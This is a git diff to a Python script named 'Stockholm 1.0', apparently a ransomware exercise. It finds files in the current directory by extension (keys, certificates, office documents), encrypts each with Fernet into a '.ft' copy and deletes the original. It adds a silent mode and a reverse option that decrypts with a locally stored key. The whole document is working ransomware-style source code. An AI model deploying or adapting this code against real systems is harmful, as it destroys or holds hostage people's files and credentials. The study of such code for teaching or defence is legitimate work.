@@ -1,6 +1,8 @@
 from cryptography.fernet import Fernet
 import os
 import time
+from colorama import Fore
+import argparse
 
 file_extensions = [
     '.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', 
@@ -30,67 +32,135 @@ def generate_key():
     '''
     Generate a key and save it in key.key
     '''
+    if (os.path.exists('key')):
+        print("The file are already encrypted !")
+        exit(0)
+
     key = Fernet.generate_key()
     with open ('key', 'wb') as key_file:
         key_file.write(key)
     return key
 
-def encrypt_file(cryptography, all_files):
+def encrypt_file(cryptography, all_files, silent):
     '''
     Encrypt all files in the list
     '''
+        
     for file in all_files:
+        if not silent:
+            print(Fore.RED + file, "Encrypting...", Fore.RESET)
+            time.sleep(0.05)
+
         with open(file, 'r') as file_no_crypto:
             file_data = file_no_crypto.read()
         
         content_file_crypto = cryptography.encrypt(file_data.encode())
 
+        if not silent:
+            print(content_file_crypto)
+
         with open(file + ".ft", 'wb') as file_crypto:
             file_crypto.write(content_file_crypto)
+        
+        if not silent:
+            print(Fore.BLUE + "#########################################" + Fore.RESET)
 
-def decrypt_files(cryptography, all_files):
+
+def decrypt_files(all_files, silent):
+    '''
+    Decrypt all files in the list
+    '''
+
+    try:
+        with open('key', 'rb') as key_file:
+            cryptography = Fernet(key_file.read())
+    except:
+        for file in all_files:
+            if file.endswith('.ft'):
+                print("The key file is missing")
+                exit(1)
+        print("The files are not encrypted") 
+        exit(1)
+
     for file in all_files:
-        with open (file + '.ft', 'r') as file_crypto:
+        if not silent:
+            print(Fore.GREEN + file, "Decrypting..." ,Fore.RESET)
+            time.sleep(0.05)
+
+        with open (file, 'r') as file_crypto:
             file_data = file_crypto.read()
 
         file_content = cryptography.decrypt(file_data)
 
-        with open(file, 'wb') as file_no_crypto:
+        if not silent:
+            print(file_content)
+
+        with open(file[:-3], 'wb') as file_no_crypto:
             file_no_crypto.write(file_content)
+
+        if not silent:
+            print(Fore.BLUE + "#########################################" + Fore.RESET)
     
 
 def remove_not_encrypted_files(all_files):
+    '''
+    Remove all files that are not encrypted
+    '''
     for file in all_files:
         os.remove(file)
 
 def remove_encrypted_files(all_files):
+    '''
+    Remove all files that are encrypted
+    '''
     for file in all_files:
-        os.remove(file + '.ft')
+        os.remove(file)
     os.remove('key')
 
-def select_files_with_good_extension():
+def select_files_with_good_extension(reverse):
     '''
     Select all files with good extension
     '''
     all_files = os.listdir()
     files = []
     for file in all_files:
-        for extension in file_extensions:
-            if file.endswith(extension):
+        if reverse == False:
+            for extension in file_extensions:
+                if file.endswith(extension):
+                    files.append(file)
+        else:
+            if file.endswith('.ft'):
                 files.append(file)
     return files
 
+def do_parse():
+    '''
+    Parse the arguments
+    '''
+    parser = argparse.ArgumentParser(description="Description de votre programme")
+    parser.add_argument("-s", "--silent", help="Silent mode and Speed mode", action="store_true")
+    parser.add_argument("-v", "--version", help="Show the version", action="store_true")
+    parser.add_argument("-r", "--reverse", help="Decrypt the files", action="store_true")
+    
+    return parser.parse_args()
+
 
 def main():
-    all_files = select_files_with_good_extension()
-    key = generate_key()
-    cryptography = Fernet(key)
-    encrypt_file(cryptography, all_files)
-    remove_not_encrypted_files(all_files)
-    print("All files encrypted")
-    time.sleep(5)
-    decrypt_files(cryptography, all_files)
-    remove_encrypted_files(all_files)
+    args = do_parse()
+    all_files = select_files_with_good_extension(args.reverse)
+    if (args.version):
+        print("Stockholm 1.0")
+        exit(0)
+    if args.reverse == False:
+        key = generate_key()
+        cryptography = Fernet(key)
+        encrypt_file(cryptography, all_files, args.silent)
+        remove_not_encrypted_files(all_files)
+        print(Fore.RED + "All files encrypted", Fore.RESET)
+    else:
+        decrypt_files(all_files, args.silent)
+        remove_encrypted_files(all_files)
+        print(Fore.GREEN + "All files decrypted", Fore.RESET)
 
 
 main()
